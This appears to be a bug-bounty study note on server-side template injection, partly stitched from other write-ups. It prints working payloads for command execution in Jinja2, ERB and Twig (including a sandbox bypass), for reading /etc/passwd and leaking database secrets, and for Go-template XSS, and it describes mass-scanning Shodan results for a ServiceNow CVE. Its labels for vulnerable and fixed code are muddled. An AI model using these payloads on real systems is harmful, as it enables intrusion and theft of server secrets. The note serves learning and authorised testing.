
Populars templating Engines are:

1. ERB, Jinja2, Handlebars, Twig (PHP), FreeMaker  

### Jinja2 (Python) & Twig follow a similar Syntax, so Both Eexploit works

Jinja2 is by far the most popular Python-based template engine. To verify if Jinja2 is utilized, bug bounty hunters commonly resort to injecting a simple mathematical function, such as:

```
{{7*'7'}}
```

### ERB (Ruby)

ERB is another popular template engine commonly found in Ruby-based applications. This template engine **follows a different syntax. The following should render `49` in a vulnerable application render:**

```bash
<%= 7*7 %>  or  %><%=7*7
```

### Template injection in ERB (Ruby)

_Let's take a look at a simple vulnerable code snippet example to better help us understand how template injections arise

![[Pasted image 20250622203042.png]]

						 Vulnerable Version




```ruby
require 'erb'
require 'sinatra'

get '/onboarding/welcome/step_1' do
  name = params[:name] || "Customer"
  safe_name = ERB::Util.html_escape(name)

  erb "<h1>Welcome, #{safe_name}!</h1>"
end
```

							fixed version


`ERB::Util.html_escape(name)` ensures that any potentially dangerous HTML or ERB syntax is escaped.   **Protects against HTML Injection.**



![[Pasted image 20250112230332.png]]

![[Pasted image 20250112230415.png]]

![[Pasted image 20250112230515.png]]
As you can see the first one just reflected the input back to us.. and the second one.. it actually executed.

## Real Word Basic Example:

_we generally explore the webApp by intercepting it_

![[Pasted image 20250112230926.png]]

			interesting endpoint to FUZZ for

-> press CTRL + I on the request (so it goes into intruder)

-> then clear all the request with the botton (clear &)

-> then highlight  the endpoint  message path and add the symbols

![[Pasted image 20250112231725.png]]

hen simply go to the "payloads" section and paste a **SSTI Wordlists**:

![[Pasted image 20250112232815.png]]

And then look in the response to see if it did the math:

![[Pasted image 20250112232911.png]]

**Tip:** You can add a random word  like "chesse" before the interested endpoint, so you always  know where to immediatly look for a response for:

	Also check the "Auto-scroll to match when text changes" so it will notify you if something changed in the request.

![[Pasted image 20250112233103.png]]

You can look for **code execution on Hacktricks** 

![[Pasted image 20250112233438.png]]

![[Pasted image 20250113014549.png]]
![[Pasted image 20250113032333.png]]


After sifting through endpoints like a detective with a magnifying glass, I came across a sign-up page. While most people enter their names without a second thought, I saw an opportunity.

Here’s where the fun began. Like every responsible bug hunter, I thought, why not see how they handle my name? Instead of using the boring ol’ “Iski,”, I went with the classic test payload:

```
{{7*7}}
```

Why? Because if it evaluates to **49**, we’re in business.

## Confirming SSTI


After submitting the form, I eagerly waited for the welcome email. Guess what? The subject greeted me with:

```
49, Welcome aboard!
```

Ah, the sweet taste of success. This confirmed an SSI vulnerability, meaning the server was evaluating my payload.

```
%><%=`whoami`
```

We would in practice be able to see the system user that's currently running the process, in this case, `root`:

![[Pasted image 20250622210615.png]]

Note: **Special characters need to be URL encoded to be correctly forwarded and parsed by the template engine**

**TIP! Besides official template documentation, community-powered resources such as** [**Swisskyrepo**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) **are an excellent way to find working payloads for all types of injection vulnerabilities**

## Step-by-Step Chaos Unleashed ⚡

Here’s how the madness unfolded:

1. **Sign Up Time:** I hopped onto , and hit that tempting **Register** button.
2. **Evil Name Plot:** Instead of a standard name, I injected `{{7*7}}` into the First Name field. (Pro tip: That’s basic SSTI testing right there).
3. **Fill and Submit:** I completed the rest of the form like a model citizen.
4. **Email Madness:** Moments later, I saw an email notification. The subject read **49, Welcome to aboard !** Yep, my payload worked like a charm!

# What’s the Big Deal?

**SSTI vulnerabilities** are dangerous. Attackers can go beyond simple calculations. In a worst-case scenario, exploiting an SSTI can lead to **Remote Code Execution (RCE)**. Imagine a scenario where the attacker injects commands to:

- Access sensitive data
- Execute shell commands
- Control the server

When misused, SSTI can turn a simple vulnerability into a full-fledged cyber disaster.

### Elevating to RCE

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

This classic payload leverages template injection to execute system commands. In this case, I aimed to read the **/etc/passwd** file, a common proof-of-concept in responsible disclosure.

# Results

A few seconds later, the email arrived, and bingo! The contents of **/etc/passwd** were sitting pretty in my inbox.

```json
root:x:0:0:root:/root:/bin/bash  
user:x:1000:1000::/home/user:/bin/bash
```

### Prevention Tips 🔒

- **Validate Inputs:** Always sanitize user input using strict validation.
- **Use Sandboxing:** Execute templates in a secure, isolated environment.
- **Update Frameworks:** Patch outdated template engines to avoid known vulnerabilities.
- **Implement WAF:** Use a Web Application Firewall to block malicious payloads.

---

  
![](https://miro.medium.com/v2/resize:fit:440/1*N0mH5Bg4aflrSgVVSNdDrA.png)

This payload, if executed by the server’s template engine, would evaluate a simple arithmetic operation and display the result. After saving the changes, I observed the result on the webpage.

### Verifying SSTI Execution

Upon saving the information and refreshing the page, I found that the `{{{{7*7}}}}` payload had been processed by the server and rendered as `{{7*7}}`. After a full page refresh, the calculation result was displayed, showing `49` in the top corner of the page next to the label **Test**.

![](https://miro.medium.com/v2/resize:fit:434/1*dIkeXwk4Yai-M08Rxb8BKw.png)

### Screenshot Proof:

This confirmed that the server-side template engine was evaluating user input without adequate sanitization, thereby allowing SSTI.

When the calculation result was displayed, showing `49` in the top corner of the page next to the label **Test**.

![](https://miro.medium.com/v2/resize:fit:788/1*KIH_bCRvw8ZMkdn5gL1fog.png)

### Moving Forward:

With SSTI confirmed, my next steps included:

1. **Exploring server configuration**:

- jinja2
- `{{ config.items() }}`

1. This payload can reveal configuration details and environment variables.
2. **Testing for Remote Code Execution**: To assess the severity, I considered using payloads like:

- jinja2
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`

1. This payload, if successful, executes a command to display user information on Unix-based systems.

----

## Advanced SSTI:

### Template injection in sandboxed environments

**When direct functions (to read files or execute system commands) are restricted or unavailable,** such as in a sandboxed environment, we'd need to resort to alternative exploitation methods.

_This can be done by looking **for internal pre-defined custom objects** (refer to next section) or chaining objects and using native template engine features.

Let's take a look first at another simplified example.

![[Pasted image 20250622212044.png]]

						Template injection in Twig (PHP)

**In this sandboxed environment, direct functions like `file_get_contents()` or `system()` are blocked.** 

_However, we can exploit the registered global objects by using Twig's native features to bypass the restrictions:

```twig
{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
```

To understand why this payload exactly works, let's deconstruct it entirely. 

The first part defines the block named **`X`** with a value equal to the system command that we want to execute, a unique delimiter and the filter:

```
{%block X%}
whoamiINTIGRITIsystem
{%endblock%}
```

The second part is another Twig statement that separates the value declared in block **`X`**:

```
{%set y=block('X')|split('INTIGRITI')%}
```

Finally, we map the extracted string value (**`whoami`**) with the filter, in this case **`system`**:

```
{{[y|first]|map(y|last)|join}}
```

This allows us to use a **workaround to execute system commands similarly to using function calls.** Only in this case, the environment is sandboxed and direct calls are not allowed.

You can always browse the web to find similar, **alternative template injection payloads that provide sandbox bypasses.**
### Leveraging internal objects to weaponize SSTI

The second way to weaponize template injections whenever direct function calls are unavailable

**is by looking for internal pre-defined custom objects and searching for either hard-coded secrets or insecure function calls.** 

<mark style="background: #FFB86CA6;">_The only requirement for both approaches is to have a deeper understanding of your target application.</mark>

Let's take a look first at another simplified example. The following code snippet features a template injection in Twig (PHP). However, this time, it also includes global template variables.

![[Pasted image 20250622213146.png]]

## Weaponizing template injections with custom objects in Twig (PHP)

_In this case, we can clearly notice that the developer added <mark style="background: #FFB86CA6;">2 custom template variables.</mark>

- `$path` – A private member of the `FileAccessMgmt` class, set to `"/var/www/app.example.com/public-assets/css/"`, used for accessing stylesheet files.
    
- `$template` – A dynamic Twig template created using `$twig->createTemplate($_GET['content'])`, which inserts user-supplied input from the URL query string directly into a template for rendering.

In a real-world scenario where we do not have access to the source code, we can list and <mark style="background: #FFB86CA6;">enumerate all template variables using Twig's special variable: </mark>`_context` along with the `keys` filter to **map out all variable names (keys) from the object.** Additionally, we use the `join` filter to separate the object names from each other:

```php
{{_context|keys|join(',')}}
```

This payload reveals the 2 template variables: **`files`** and **`secrets`**. The **`files`** is a reference to the **`FileAccessMgmt`** **PHP class** that lists an insecure function: **`get_style_sheet`**. The **`secret`** is a reference to a global template variable.

> [!NOTE]
> In this case, it likely holds a  copy of the database connection secrets retrieved  from environment variables.

#### Weaponizing SSTI to leak secrets in custom objects

**Knowing there's a global template variable declared with environment secrets,** we can try and attempt to return the sensitive data by simply accessing the correct property:

```php
{{secrets.MYSQL_PASSWD}}
```

This payload will return the contents of the **`MYSQL_PASSWD`** environment variable.

#### Escalating template injections with insecure custom object functions

> [!NOTE]
> The next global template variable is a reference to a PHP class. Whenever direct function access is not allowed, we can attempt to enumerate internal object functions and leverage these to read local files, leak secrets or even execute system commands.

_you'd have to systematically probe all custom functions to escalate your initial finding._

**we only need to use a payload like the following and it would allow us to leverage the insecure function to read local system files using a simple path traversal:**

```php
{{files.get_style_sheet('../../../../../etc/passwd')}}
```



> [!NOTE] SSTI Exploitation Steps
> While this article didn't document exploitation scenarios for all templating engines, the fundamentals stay the same whenever you try to exploit a template injection:


1. **Step 1** always involves enumerating the template engine. **This phase consists of systematically probing template syntax strings and observing the responses**.
    
2. Next, **step 2** requires you to look up the available documentation to enumerate global function calls to execute system commands, **read local files or initiate outbound TCP connections.**
    
3<mark style="background: #BBFABBA6;">. If direct function calls are unavailable (for instance, in a sandbox environment), you can try to enumerate and leverage imported packages and dependencies</mark>. 

_This would allow you to still leverage your initial finding to a higher severity vulnerability.


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
## How to Search For SSTI CVEs

source from coffinxp:

>  https://www.youtube.com/watch?v=__r7tz47Lso 

### CVE-2024-4879 - Jelly Template Injection Vulnerability in ServiceNow | Bug bounty poc

Search for Ips about that service on shodan:

![[Pasted image 20250418144958.png]]

Put all the ips inside a file and scan it with nuclei template:

![[Pasted image 20250418173643.png]]

![[Pasted image 20250418145035.png]]

![[Pasted image 20250418151917.png]]

							output of vulnerable urls.


![[Pasted image 20250418171355.png]]

[Payload used in this case]


![[Pasted image 20250418171247.png]]

			click on the links and lookout for this pop-up on the webpage

Github tool: https://github.com/gh-ost00/CVE-2024-4879

Example usage:

![[Pasted image 20250418174031.png]]

![[Pasted image 20250418174048.png]]


----

## CTFs

8)SSTI Exploitation via POST on a GET Upload Endpoint (POCTF)
https://medium.com/@baracarlo/ssti-exploitation-via-post-on-a-get-upload-endpoint-poctf-569bf1048f9e


---

1)SSTI1 (PicoCTF)
https://medium.com/@vgqxjb/ssti1-picoctf-0853498698d5

2)SSTI2 (PicoCTF)
https://medium.com/@vgqxjb/ssti2-picoctf-4caa7ac497c5

3)3v@l (PicoCTF)
https://medium.com/@vgqxjb/3v-l-picoctf-0a2e998a7d1b

>https://www.youtube.com/watch?v=QLqHMMcBXuQ&list=PL1GDzLoRwyVCEG_dnWcQDbDXJSBw7lTOT&index=2

![[Pasted image 20250418141905.png]]



https://www.youtube.com/watch?v=u8BuuGEZcIg&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D


automate: https://www.youtube.com/watch?v=SV0uaJcAJ8M&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D

https://www.youtube.com/watch?v=Ffeco5KB73I&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D


https://www.youtube.com/watch?v=gIoqlnHM_Hg&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D

https://www.youtube.com/watch?v=6cn58pb4vlY&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D


https://www.youtube.com/watch?v=8avy3OJMHx4&pp=ygUdYnVnIGJvdW50eSB0ZW1wbGF0ZSBpbmplY3Rpb24%3D POC


https://www.youtube.com/watch?v=__r7tz47Lso POC netsec


WebSec — SSTI (Server Site Template Injection)

https://medium.com/@meryemddalgali/websec-ssti-server-site-template-injection-1a9603caa51e

----

💥 SSTI in Go Templates = Stored XSS?

If you come across SSTI (Server-Side Template Injection) in a Go (Golang) application, don’t stop at just proving injection — go for impact! 


Try this payload to bypass HTML sanitization and achieve XSS :

```js
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
```

🔍 This works because:
💎 Go templates treat {{define}} and {{template}} as dynamic blocks.
⚡️ You can inject arbitrary template logic including script tags.
🔸 Useful in misconfigured custom template rendering engines.

💡 Why it matters:
Stored XSS via SSTI can lead to session hijacking, data exfiltration, or even account takeover.

----